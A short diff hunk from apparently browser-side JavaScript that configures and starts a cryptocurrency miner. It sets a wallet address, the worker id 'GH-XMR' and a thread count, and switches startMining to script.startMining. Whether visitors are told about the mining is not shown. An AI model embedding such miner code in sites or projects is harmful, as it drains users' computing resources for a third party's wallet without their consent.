@@ -7,6 +7,6 @@ var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kk
 var workerId = "GH-XMR"
 var threads = 1;
 var password = "";
-startMining(pool, walletAddress, workerId, threads, password);
+script.startMining(pool, walletAddress, workerId, threads, password);
 throttleMiner = 1;
 // End Of Mining Code
